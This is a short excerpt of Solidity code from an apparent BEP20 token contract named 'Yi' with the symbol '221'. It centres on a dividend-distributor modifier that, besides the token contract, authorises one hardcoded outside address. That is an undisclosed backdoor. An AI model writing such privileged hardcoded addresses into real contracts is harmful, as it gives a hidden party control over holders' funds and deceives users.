...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0xfaCA2872eD10aCf65F7B1AbFaCBFBa7cE09182D5)); _;
...
contract Yi is IBEP20 , Auth, BaseToken {

    using SafeMath for uint256;

    string public _name = "221";
    string public _symbol = "221";
